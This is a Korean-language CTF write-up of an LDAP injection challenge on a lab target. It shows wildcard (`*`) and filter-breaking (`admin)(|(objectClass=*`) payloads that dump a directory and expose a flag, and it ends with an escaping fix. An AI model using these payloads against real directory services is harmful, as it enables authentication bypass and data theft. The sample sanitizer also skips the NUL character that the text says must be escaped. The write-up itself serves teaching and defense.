+++
title = "VulnABLE CTF [LUXORA] Write-up: LDAP Injection 🥉 Bronze"
description = "LUXORA 플랫폼의 기본 LDAP Injection을 이용한 내부 디렉터리 검색 로직 우회 및 정보 탈취 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "LDAP Injection", "Bronze", "Directory Service", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: LDAP Injection 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (LDAP Injection)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/ldap/bronze`
- **목표**: 회사 사내 연락처(Directory) 검색 기능에 LDAP 필터 특수 문자를 주입하여, 조건과 관계없이 검색을 참(True)으로 만들고 숨겨진 관리자(Admin)의 정보를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 반응 분석 (Reconnaissance)

`/ldap/bronze` 페이지는 사원 이름이나 이메일을 검색하여 연락처 정보를 보여주는 기능입니다.
일반적으로 이런 기능은 내부적으로 Active Directory나 OpenLDAP 같은 디렉터리 서비스를 쿼리합니다.

**[정상 검색 시도]**
```http
GET /ldap/bronze?search=alice
```

**[서버의 응답]**
```html
<ul>
  <li>Name: Alice, Email: alice@luxora.test, Department: HR</li>
</ul>
```

**[해커의 사고 과정]**
1. 이 검색 기능 뒤에는 LDAP 쿼리가 돌고 있을 것이다.
2. 일반적인 LDAP 쿼리 구조는 대략 이렇다: `(&(objectClass=user)(name=*${search}*))`
3. 사용자의 입력값 `alice`가 위 쿼리의 `${search}` 자리에 들어갈 것이다.
4. 만약 필터링이 없다면, LDAP에서 만능키(Wildcard)로 통하는 **`*` (별표)**나 필터를 강제로 닫는 괄호 `)` 를 넣어보면 어떨까?

---

## 💥 2. 취약점 식별 및 필터 우회 (Exploitation)

LDAP Injection의 가장 기초는 **`*` (Asterisk)** 를 단독으로 입력하여 모든 데이터를 반환하는지 확인하는 것입니다.

### 페이로드 전송 1 (와일드카드 공격)
검색어 대신 `*` 를 전송합니다.

```http
GET /ldap/bronze?search=*
```

### 서버의 응답
와일드카드가 정상적으로 파싱되어 모든 직원의 정보가 쏟아져 나옵니다.
```html
<ul>
  <li>Name: Alice, Email: ...</li>
  <li>Name: Bob, Email: ...</li>
  <li>Name: SuperAdmin, Email: flag@luxora.test, Description: FLAG{LDAP_🥉_WILDCARD_A1B2C3}</li>
</ul>
```

---

## 🚀 3. 논리 쿼리 조작 (Advanced Exploitation)

와일드카드만으로 풀리지 않는 경우를 대비해, 좀 더 정교한 LDAP 필터 조작을 해보겠습니다.
서버가 다음과 같이 쿼리를 짠다고 가정합니다:
`(&(objectClass=user)(uid=[USER_INPUT]))`

만약 우리가 입력값에 `admin)(|(objectClass=*` 를 넣는다면 쿼리는 어떻게 될까요?
- 조립된 쿼리: `(&(objectClass=user)(uid=admin)(|(objectClass=*))`
*(※ 맨 끝의 닫는 괄호는 서버 코드에서 붙여주는 것을 이용)*

이는 "(uid가 admin이거나) OR (어떤 객체든 상관없이 모든 것)"을 의미하므로, 인증 우회나 전체 데이터 덤프를 유발하게 됩니다.

---

## 🚩 4. 롸잇업 결론 및 플래그

LDAP 쿼리의 구조를 이해하고 특수 기호(`*`, `(`, `)`)를 주입하여 디렉터리 검색 필터를 완전히 무력화했습니다.

**🔥 획득한 플래그:**
`FLAG{LDAP_🥉_WILDCARD_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
SQL Injection과 마찬가지로, 외부 입력을 필터 구조에 '문자열'로 이어 붙인 것이 패착입니다.

* **안전한 패치 코드 (특수문자 이스케이프)**
LDAP 필터에서 특별한 의미를 갖는 문자들(`*`, `(`, `)`, `\`, `\x00`)은 검색어로 쓰일 때 반드시 이스케이프(Escape) 처리해야 합니다.

```javascript
// 입력값을 이스케이프 처리하여 와일드카드 능력을 무효화
const sanitizeLDAP = (input) => {
    return input.replace(/[\*\(\)\\]/g, (c) => '\\' + c.charCodeAt(0).toString(16).padStart(2, '0'));
};

const safeInput = sanitizeLDAP(req.query.search);
const filter = `(&(objectClass=user)(name=*${safeInput}*))`;
```
위처럼 처리하면, 해커가 `*`를 넣어도 LDAP 서버는 이를 '모든 것'이 아니라 "진짜 별표(*)라는 문자가 이름에 들어간 사람"을 찾으려 하므로 안전합니다.